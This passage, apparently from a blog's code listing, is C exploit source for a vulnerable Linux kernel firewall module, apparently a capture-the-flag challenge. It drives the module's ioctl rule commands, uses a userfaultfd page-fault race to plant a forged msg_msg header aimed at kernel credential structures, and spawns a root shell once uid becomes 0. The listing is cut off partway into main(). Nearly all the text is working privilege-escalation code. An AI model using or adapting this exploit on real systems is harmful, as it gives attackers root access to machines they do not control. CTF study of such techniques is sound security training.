class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;byteswap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/timerfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/reboot.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RULE 0x1337babe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELETE_RULE 0xdeadbabe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EDIT_RULE 0x1337beef</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHOW_RULE 0xdeadbeef</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DUP_RULE 0xbaad5aad</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_API 0xc018aa3f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_REGISTER 0xc020aa00</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_UNREGISTER 0x8010aa01</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_COPY 0xc028aa03</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_ZEROPAGE 0xc020aa04</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_WAKE 0x8010aa02</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INBOUND 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OUTBOUND 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SKIP -1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *page;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DESC_MAX 0x800</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> netmask[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> idx;</span><br><span class="line">    <span class="keyword">uint8_t</span> type;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="keyword">char</span> desc[DESC_MAX];</span><br><span class="line">&#125; User_rule_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> ip;</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="keyword">uint8_t</span> is_duplicated;</span><br><span class="line">    <span class="keyword">char</span> desc[DESC_MAX];</span><br><span class="line">&#125; Rule_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ll_next;</span><br><span class="line">    <span class="keyword">void</span> *ll_prev;</span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;</span><br><span class="line">    <span class="keyword">void</span> *next;</span><br><span class="line">    <span class="keyword">void</span> *security;</span><br><span class="line">&#125;msg_header;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> target_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_cred_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> fd=<span class="number">0</span>;</span><br><span class="line">err_exit(<span class="keyword">char</span> *buf)&#123;</span><br><span class="line">    <span class="built_in">puts</span>(buf);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ioctl</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> request, <span class="keyword">unsigned</span> <span class="keyword">long</span> param)</span> <span class="comment">//ioctl wrapper</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ioctl\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_ioctl, fd, request, param);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_t</span> monitor_thread;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerUserFaultFd</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> (*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">fault_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="built_in">memset</span>(page,<span class="number">0</span>,page_size);</span><br><span class="line">        <span class="built_in">memcpy</span>(page+ <span class="number">0x1000</span><span class="number">-0x30</span>,&amp;init_cred_addr,<span class="number">8</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(page+ <span class="number">0x1000</span><span class="number">-0x30</span>+<span class="number">8</span>,&amp;init_cred_addr,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        msg_header fake_msg_header;</span><br><span class="line">        fake_msg_header.ll_next=(<span class="keyword">void</span> *)<span class="number">0x4141414141414141</span>;</span><br><span class="line">        fake_msg_header.ll_prev=(<span class="keyword">void</span> *)<span class="number">0x4242424242424242</span>;</span><br><span class="line">        fake_msg_header.m_ts=<span class="number">0x1000</span><span class="number">-0x30</span>+<span class="number">0x8</span>;</span><br><span class="line">        fake_msg_header.next=target_addr;</span><br><span class="line">        fake_msg_header.m_type=<span class="number">1</span>;</span><br><span class="line">        edit_rule(fd,&amp;fake_msg_header,<span class="number">1</span>,OUTBOUND,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            err_exit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_IPv4</span><span class="params">(<span class="keyword">uint32_t</span> ip,<span class="keyword">char</span> *ipv4)</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(ipv4,<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d.%d.%d.%d\n&quot;</span>,(ip&amp;<span class="number">0xff</span>),(ip&amp;<span class="number">0x0000ff00</span>)&gt;&gt;<span class="number">8</span>,(ip&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">16</span>,(ip&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(ipv4,<span class="string">&quot;%d.%d.%d.%d&quot;</span>,(ip&amp;<span class="number">0xff</span>),(ip&amp;<span class="number">0x0000ff00</span>)&gt;&gt;<span class="number">8</span>,(ip&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">16</span>,(ip&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">User_rule_t* <span class="title">init_user_rule</span><span class="params">(<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type,<span class="keyword">u_int32_t</span> ip,<span class="keyword">u_int32_t</span> netmask)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    User_rule_t *user_rule=(User_rule_t *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(User_rule_t));</span><br><span class="line"></span><br><span class="line">    user_rule-&gt;idx=idx;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    get_IPv4(ip,&amp;(user_rule-&gt;ip));</span><br><span class="line"></span><br><span class="line">    get_IPv4(netmask,&amp;(user_rule-&gt;netmask));</span><br><span class="line"></span><br><span class="line">    user_rule-&gt;type=type;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;idx:%d\n&quot;</span>,user_rule-&gt;idx);</span><br><span class="line">    <span class="keyword">return</span> user_rule;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;idx:%d\n&quot;</span>,<span class="keyword">user_rule_t</span>-&gt;idx);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,ADD_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;add fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,DELETE_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;del fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dup_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,DUP_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;edit fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf,<span class="keyword">int</span> idx,<span class="keyword">int</span> type,<span class="keyword">int</span> flags)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> ip=*(<span class="keyword">uint32_t</span> *)(buf+<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask=*(<span class="keyword">uint32_t</span> *)(buf+<span class="number">0x24</span>);</span><br><span class="line">    User_rule_t *user_rule=init_user_rule(idx,type,ip,netmask);</span><br><span class="line">    <span class="built_in">memcpy</span>(user_rule,buf,<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span>(!flags)&#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;(user_rule-&gt;ip),<span class="string">&quot;qqqqqqqqqq&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;qqqqqqqqqq&quot;</span>));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;(user_rule-&gt;netmask),<span class="string">&quot;qqqqqqqqqq&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;qqqqqqqqqq&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,EDIT_RULE,user_rule);</span><br><span class="line">    <span class="comment">// if(ret&lt;0)&#123;</span></span><br><span class="line">    <span class="comment">//     err_exit(&quot;edit fail&quot;);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msgflg)) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msqid,<span class="keyword">void</span> *msgp,<span class="keyword">size_t</span> msgsz,<span class="keyword">long</span> msgtype,<span class="keyword">int</span> msgflag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=msgrcv(msqid,msgp,msgsz,msgtype,msgflag);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgrcv fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msqid,<span class="keyword">void</span> *msgp,<span class="keyword">size_t</span> msgsz,<span class="keyword">int</span> msgflag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=msgsnd(msqid,msgp,msgsz,msgflag);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgsend fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span 